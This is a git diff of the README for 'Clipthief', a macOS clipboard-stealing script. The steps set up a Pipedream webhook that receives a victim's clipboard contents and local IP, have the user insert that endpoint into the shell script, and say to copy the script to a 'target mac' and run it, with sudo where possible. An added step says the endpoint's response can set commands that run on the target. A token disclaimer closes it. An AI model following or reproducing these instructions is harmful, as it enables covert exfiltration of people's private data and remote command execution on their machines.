@@ -16,8 +16,12 @@ Local IP --> {{steps.trigger.event.body.localip}}
 Clipboard Data --> {{event.body.clipboard}}
 -------------------------------------------------
 ```
-7. Copy the endpoint in the trigger called steps.trigger (https://xxxxxxxxxxxxx.m.pipedream.net)
+7. Copy the endpoint in the trigger called `steps.trigger` (https://xxxxxxxxxxxxx.m.pipedream.net)
 8. Replace `REPLACE_ME` in [clipthief.sh](https://github.com/rhijjawi/Clipthief/blob/main/shell/clipthief.sh) with your endpoint
-9. Copy the shell file to your target mac and execute it with `sudo ./clifthief.sh` or `./clipthief.sh` if the user does not have root privileges or the root password is unknown. 
+9. Copy the shell file to your target mac and execute it with `sudo ./clifthief.sh` or `./clipthief.sh` if the user does not have root privileges or the root password is unknown.
 10. Have fun (Copy something)
-11. Open an issue if something doesn't work
+11. You can customize what commands are executed when something is copied from the `script` field in `steps.http_response`
+12. Open an issue if something doesn't work
+
+## Disclaimer
+This script is for demonstration purposes **ONLY**. I (rhijjawi) am in no way responsible for your actions. Have fun :D.
